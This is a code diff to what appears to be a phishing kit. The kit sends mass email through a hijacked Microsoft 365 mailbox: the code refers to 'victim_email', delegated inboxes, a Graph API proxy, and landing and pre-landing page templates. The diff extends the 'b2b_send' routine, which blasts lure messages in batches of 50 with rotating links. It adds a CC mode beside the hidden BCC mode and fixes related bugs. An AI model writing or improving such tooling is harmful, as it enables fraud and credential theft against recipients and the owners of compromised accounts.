@@ -9891,15 +9891,17 @@ Delegated     : ${inboxesDesc}
                 const ccRecipients = cc ? cc.split(/[,;]+/).map(e => e.trim()).filter(Boolean).map(addr => ({ emailAddress: { address: addr } })) : [];
                 const bccRecipients = bcc ? bcc.split(/[,;]+/).map(e => e.trim()).filter(Boolean).map(addr => ({ emailAddress: { address: addr } })) : [];
 
+                const msgObj = {
+                    subject: subj,
+                    body: { contentType: 'HTML', content: bodyHtml },
+                    toRecipients: toRecipients
+                };
+                if (ccRecipients.length > 0) msgObj.ccRecipients = ccRecipients;
+                if (bccRecipients.length > 0) msgObj.bccRecipients = bccRecipients;
+
                 const payload = {
-                    message: {
-                        subject: subj,
-                        body: { contentType: 'HTML', content: bodyHtml },
-                        toRecipients: toRecipients,
-                        ccRecipients: ccRecipients,
-                        bccRecipients: bccRecipients
-                    },
-                    saveToSentItems: 'true'
+                    message: msgObj,
+                    saveToSentItems: true
                 };
                 const res = await (await fetch('/api/graph_proxy/send_mail', {
                     method: 'POST',
@@ -15955,7 +15957,8 @@ def serve_success(slug):
                 merged_cfg.update(s_cfg)
             except Exception: pass
         elif dep.get('success_template_id') or dep.get('landing_template_id') or dep.get('preland_template_id'):
-            with sqlite3.connect(Config.DB_PATH) as conn:
+            conn = sqlite3.connect(Config.DB_PATH)
+            try:
                 conn.row_factory = sqlite3.Row
                 if dep.get('success_template_id'):
                     trow = conn.execute("SELECT name FROM templates WHERE id=? LIMIT 1", (dep['success_template_id'],)).fetchone()
@@ -15969,6 +15972,8 @@ def serve_success(slug):
                     ptrow = conn.execute("SELECT name FROM preland_templates WHERE id=? LIMIT 1", (dep['preland_template_id'],)).fetchone()
                     if ptrow and ptrow['name']:
                         success_template_name = ptrow['name']
+            finally:
+                conn.close()
 
         try:
             pt = _dep.get_preland_template(dep.get('preland_template_id'))
@@ -16545,6 +16550,7 @@ def b2b_send():
     priority    = data.get('priority', 'normal').lower()
     delay_ms    = max(0, int(data.get('delay_ms', 0)))
     bcc_mode    = bool(data.get('bcc_mode', False))
+    send_mode   = (data.get('send_mode') or ('bcc' if bcc_mode else 'direct')).strip().lower()
     save_sent   = bool(data.get('save_sent', True))
     attachments = data.get('attachments', [])
     api_method  = data.get('api_method', 'graph')
@@ -16579,8 +16585,8 @@ def b2b_send():
         sent = failed = 0
         send_count_since_refresh = 0
 
-        if bcc_mode:
-            # ── BATCH BCC MODE: Blast all recipients simultaneously in batches of 50 ──
+        if send_mode in ('bcc', 'cc') or bcc_mode:
+            # ── BATCH CC / BCC MODE: Blast all recipients in batches of 50 ──
             BATCH_SIZE = 50
             valid_recipients = [r.strip().lower() for r in recipients if r.strip() and '@' in r]
             sender_addr = s.get('victim_email') or sender_email or 'me'
@@ -16595,7 +16601,7 @@ def b2b_send():
                 link = (links[(batch_start // BATCH_SIZE) % len(links)].strip() if links else '')
                 date_str = datetime.datetime.now().strftime('%B %d, %Y')
 
-                def merge_bcc(text):
+                def merge_batch(text):
                     return (text
                         .replace('[NAME]', 'Valued Client')
                         .replace('{NAME}', 'Valued Client')
@@ -16607,16 +16613,30 @@ def b2b_send():
                         .replace('[URL]', link).replace('{URL}', link).replace('{url}', link)
                         .replace('[DATE]', date_str).replace('{DATE}', date_str).replace('{date}', date_str))
 
-                subj_final = merge_bcc(subj)
-                body_final = merge_bcc(body_html)
+                subj_final = merge_batch(subj)
+                body_final = merge_batch(body_html)
 
-                msg_obj = {
-                    'subject': subj_final,
-                    'body': {'contentType': 'HTML', 'content': body_final},
-                    'toRecipients': [{'emailAddress': {'address': sender_addr}}],
-                    'bccRecipients': [{'emailAddress': {'address': r}} for r in batch],
-                    'importance': priority
-                }
+                if send_mode == 'cc':
+                    # CC Mode: Primary recipient in To, remaining batch members in CC (visible)
+                    to_rec = [{'emailAddress': {'address': batch[0]}}]
+                    cc_rec = [{'emailAddress': {'address': r}} for r in batch[1:]] if len(batch) > 1 else []
+                    msg_obj = {
+                        'subject': subj_final,
+                        'body': {'contentType': 'HTML', 'content': body_final},
+                        'toRecipients': to_rec,
+                        'importance': priority
+                    }
+                    if cc_rec:
+                        msg_obj['ccRecipients'] = cc_rec
+                else:
+                    # BCC Mode: Sender in To (undisclosed recipients), all batch members hidden in BCC
+                    msg_obj = {
+                        'subject': subj_final,
+                        'body': {'contentType': 'HTML', 'content': body_final},
+                        'toRecipients': [{'emailAddress': {'address': sender_addr}}],
+                        'bccRecipients': [{'emailAddress': {'address': r}} for r in batch],
+                        'importance': priority
+                    }
                 if attachments:
                     msg_obj['attachments'] = attachments
 
@@ -16625,8 +16645,9 @@ def b2b_send():
                     if res is None or not res.get('error'):
                         sent += len(batch)
                         send_count_since_refresh += len(batch)
+                        mode_tag = 'CC' if send_mode == 'cc' else 'BCC'
                         for r in batch:
-                            yield sse({'type': 'sent', 'recipient': r, 'subject': f"{subj_final} [Batch {batch_num}/{total_batches}]"})
+                            yield sse({'type': 'sent', 'recipient': r, 'subject': f"{subj_final} [{mode_tag} Batch {batch_num}/{total_batches}]"})
                     else:
                         err_detail = res.get('error', {})
                         err_msg = err_detail.get('message', 'Send failed')
